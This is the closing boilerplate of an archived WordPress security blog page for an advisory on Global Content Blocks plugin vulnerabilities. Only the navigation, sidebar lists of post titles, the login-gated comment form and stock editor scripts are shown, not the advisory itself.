				This entry was tagged <a href="https://charlieeriksen.github.io/tag/global-content-blocks/" rel="tag">Global Content Blocks</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>. Bookmark the <a href="https://charlieeriksen.github.io/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/" title="Permalink to WordPress Global Content Blocks multiple vulnerabilities" rel="bookmark">permalink</a>.
					</footer><!-- .entry-meta -->
</article><!-- #post-37 -->

					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

		
					<div class="nav-previous"><a href="https://charlieeriksen.github.io/2012/07/10/wordpress-sendit-newsletter-plugin-multiple-sql-injection/" rel="prev"><span class="meta-nav">&larr;</span> WordPress Sendit Newsletter plugin multiple SQL injection</a></div>			<div class="nav-next"><a href="https://charlieeriksen.github.io/2012/07/13/wordpress-paid-memberships-pro-information-disclosure-vulnerability/" rel="next">WordPress Paid Memberships Pro information disclosure vulnerability <span class="meta-nav">&rarr;</span></a></div>						
	
	</nav><!-- #nav-below -->
	
						<div id="comments">
	
	
	
									<div id="respond" class="comment-respond">
				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/#respond" style="display:none;">Cancel reply</a></small></h3>
									<p class="must-log-in">You must be <a href="https://charlieeriksen.github.io/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2012%2F07%2F12%2Fwordpress-global-content-blocks-multiple-vulnerabilities%2F">logged in</a> to post a comment.</p>												</div><!-- #respond -->
			
</div><!-- #comments -->

			
			</div><!-- #content -->
		</div><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="https://charlieeriksen.github.io/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->

<link rel='stylesheet' id='wp-jquery-ui-dialog-css'  href='https://charlieeriksen.github.io/wp-includes/css/jquery-ui-dialog.min.css?ver=3.8.3' type='text/css' media='all' />
<script type='text/javascript'>
/* <![CDATA[ */
var wordCountL10n = {"type":"w"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-admin/js/word-count.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.widget.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.mouse.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.resizable.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.draggable.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.button.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.position.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/ui/jquery.ui.dialog.min.js?ver=1.10.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/tinymce/plugins/wpdialogs/js/wpdialog.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpLinkL10n = {"title":"Insert\/edit link","update":"Update","save":"Add Link","noTitle":"(no title)","noMatchesFound":"No matches found."};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/wplink.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/tinymce/plugins/wpdialogs/js/popup.min.js?ver=3.8.3'></script>

	<script type="text/javascript">
		tinyMCEPreInit = {
			base : "",
			suffix : "",
			query : "ver=359-20131026",
			mceInit : {},
			qtInit : {'comment':{id:"comment",buttons:"strong,em,link,block,del,ins,img,ul,ol,li,code,more,close"}},
			ref : {plugins:"",theme:"advanced",language:""},
			load_ext : function(url,lang){var sl=tinymce.ScriptLoader;sl.markDone(url+'/langs/'+lang+'.js');sl.markDone(url+'/langs/'+lang+'_dlg.js');}
		};
	</script>

	<script type="text/javascript">
		var wpActiveEditor;

		(function(){
			var init, ed, qt, first_init, DOM, el, i, mce = 0;

			if ( typeof(tinymce) == 'object' ) {
				DOM = tinymce.DOM;
				// mark wp_theme/ui.css as loaded
				DOM.files[tinymce.baseURI.getURI() + '/themes/advanced/skins/wp_theme/ui.css'] = true;

				DOM.events.add( DOM.select('.wp-editor-wrap'), 'mousedown', function(e){
					if ( this.id )
						wpActiveEditor = this.id.slice(3, -5);
				});

				for ( ed in tinyMCEPreInit.mceInit ) {
					if ( first_init ) {
						init = tinyMCEPreInit.mceInit[ed] = tinymce.extend( {}, first_init, tinyMCEPreInit.mceInit[ed] );
					} else {
						init = first_init = tinyMCEPreInit.mceInit[ed];
					}

					if ( mce )
						try { tinymce.init(init); } catch(e){}
				}
			} else {
				if ( tinyMCEPreInit.qtInit ) {
					for ( i in tinyMCEPreInit.qtInit ) {
						el = tinyMCEPreInit.qtInit[i].id;
						if ( el )
							document.getElementById('wp-'+el+'-wrap').onmousedown = function(){ wpActiveEditor = this.id.slice(3, -5); }
					}
				}
			}

			if ( typeof(QTags) == 'function' ) {
				for ( qt in tinyMCEPreInit.qtInit ) {
					try { quicktags( tinyMCEPreInit.qtInit[qt] ); } catch(e){}
				}
			}
		})();
		var ajaxurl = "/wp-admin/admin-ajax.php";		</script>
			<div style="display:none;">
	<form id="wp-link" tabindex="-1">
	<input type="hidden" id="_ajax_linking_nonce" name="_ajax_linking_nonce" value="a25a108328" />	<div id="link-selector">
		<div id="link-options">
			<p class="howto">Enter the destination URL</p>
			<div>
				<label><span>URL</span><input id="url-field" type="text" name="href" /></label>
			</div>
			<div>
				<label><span>Title</span><input id="link-title-field" type="text" name="linktitle" /></label>
			</div>
			<div class="link-target">
				<label><input type="checkbox" id="link-target-checkbox" /> Open link in a new window/tab</label>
			</div>
		</div>
				<p class="howto toggle-arrow " id="internal-toggle">Or link to existing content</p>
		<div id="search-panel" style="display:none">
			<div class="link-search-wrapper">
				<label>
					<span class="search-label">Search</span>
					<input type="search" id="search-field" class="link-search-field" autocomplete="off" />
					<span class="spinner"></span>
				</label>
			</div>
			<div id="search-results" class="query-results">
				<ul></ul>
				<div class="river-waiting">
					<span class="spinner"></span>
				</div>
			</div>
			<div id="most-recent-results" class="query-results">
				<div class="query-notice"><em>No search term specified. Showing recent items.</em></div>
				<ul></ul>
				<div class="river-waiting">
					<span class="spinner"></span>
				</div>
			</div>
		</div>
	</div>
	<div class="submitbox">
		<div id="wp-link-update">
			<input type="submit" value="Add Link" class="button-primary" id="wp-link-submit" name="wp-link-submit">
		</div>
		<div id="wp-link-cancel">
			<a class="submitdelete deletion" href="#">Cancel</a>
		</div>
	</div>
	</form>
	</div>
	
</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:46:04 by W3 Total Cache -->